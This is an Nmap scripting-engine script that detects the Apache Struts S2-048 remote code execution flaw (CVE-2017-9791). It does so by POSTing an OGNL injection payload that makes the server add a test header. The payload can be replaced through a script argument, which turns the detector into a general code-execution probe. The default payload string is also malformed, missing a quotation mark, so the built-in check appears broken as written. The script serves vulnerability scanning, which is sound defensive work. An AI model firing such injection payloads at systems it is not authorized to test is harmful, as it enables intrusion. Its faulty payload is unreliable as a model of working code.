description = [[
Detects whether the specified URL is vulnerable to the Apache Struts
Remote Code Execution Vulnerability (CVE-2017-9791).
]]

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"

---
-- @usage
-- nmap -p <port> --script http-vuln-cve2017-9791 <target>
--
-- @output
-- PORT    STATE SERVICE
-- 80/tcp  open  http
-- | http-vuln-cve2017-9791:
-- |   VULNERABLE
-- |   Apache Struts Remote Code Execution Vulnerability
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2017-9791
-- |
-- |     Disclosure date: 2017-07-07
-- |     References:
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9791
-- |_      http://struts.apache.org/docs/s2-048.html
--
-- @args http-vuln-cve2017-9791.method The HTTP method for the request. The default method is "POST".
-- @args http-vuln-cve2017-9791.path The URL path to request. The default path is "/struts2-showcase/integration/saveGangster.action".
-- @args http-vuln-cve2017-9791.payload The payload to execute. The default payload is to add a header ["X-RCE-Test"] = You can be hacked!

author = "Chapman (R3naissance) Schleiss"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln" }

-- aquatone xlarge ports
portrule = shortport.port_or_service( {80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712, 4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281, 8333, 8443, 8500, 8834, 8880, 8888, 8983, 9000, 9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 12443, 16080, 18091, 18092, 20720, 28017}, {"http", "https"}, "tcp", "open")

action = function(host, port)
  local vuln = {
    title = "Apache Struts Remote Code Execution Vulnerability",
    state = vulns.STATE.NOT_VULN,
    description = [[
Struts 2.3.x with Struts 1 plugin and Struts 1 action are vulnerable to a Remote Code Execution vulnerability 
when using untrusted input as a part of the error message in the ActionMessage class.
    ]],
    IDS = {
        CVE = "CVE-2017-9791"
    },
    references = {
        'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9791',
        'http://struts.apache.org/docs/s2-048.html'
    },
    dates = {
        disclosure = { year = '2017', month = '07', day = '07' }
    }
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local method = stdnse.get_script_args(SCRIPT_NAME..".method") or "POST"
  local path = stdnse.get_script_args(SCRIPT_NAME..".path") or "/struts2-showcase/integration/saveGangster.action"
  local payload = stdnse.get_script_args(SCRIPT_NAME..".payload") or "${#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RCE-Test',You can be hacked!')}"

  local postdata = {}
  postdata["name"] = payload
  postdata["age"] = "20"
  postdata["bustedBefore"] = "true"
  postdata["__checkbox_bustedBefore"] = "true"
  postdata["description"] = "Attempting RCE..."

  local response = http.post(host, port, path, nil, nil, postdata)

  if response and response.status == 200 and response.header["X-RCE-Test"] == 'You can be hacked!' then
    vuln.state = vulns.STATE.VULN
  else
    stdnse.debug1("Not vulnerable to CVE-2017-9791")
  end

  return vuln_report:make_output(vuln)
end
